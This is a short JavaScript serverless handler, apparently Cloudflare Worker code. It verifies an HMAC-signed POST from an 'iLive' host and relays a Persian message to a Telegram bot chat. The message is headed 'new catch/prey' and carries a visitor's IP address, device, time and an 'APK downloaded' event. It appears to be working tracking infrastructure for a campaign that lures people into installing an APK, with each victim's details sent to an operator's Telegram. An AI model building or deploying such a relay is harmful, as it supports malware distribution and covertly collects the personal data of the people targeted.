export default {
  async fetch(request, env) {
    if (request.method !== "POST") return new Response("Method Not Allowed", {status:405});
    const raw = await request.text();

    // Verify HMAC sent by iLive host.
    const sig = request.headers.get("X-iLive-Signature") || "";
    const key = await crypto.subtle.importKey(
      "raw", new TextEncoder().encode(env.RELAY_SECRET),
      {name:"HMAC", hash:"SHA-256"}, false, ["verify"]
    );
    const hex = sig.match(/.{1,2}/g) || [];
    const bytes = new Uint8Array(hex.map(x=>parseInt(x,16)));
    const ok = await crypto.subtle.verify("HMAC", key, bytes, new TextEncoder().encode(raw));
    if (!ok) return new Response("Unauthorized", {status:401});

    const x = JSON.parse(raw);
    const text =
`🐸 | شکار جدید

🌐 سایت: ${x.site || "iLive"}
🕒 زمان: ${x.time || "-"}
📱 دستگاه: ${x.device || "-"}
🌐 IP: ${x.ip || "-"}
📥 ${x.event || "APK دانلود شد"}`;

    const r = await fetch(`https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`, {
      method:"POST",
      headers:{"content-type":"application/json"},
      body:JSON.stringify({chat_id:env.TG_CHAT_ID,text})
    });
    return new Response(await r.text(), {status:r.status, headers:{"content-type":"application/json"}});
  }
};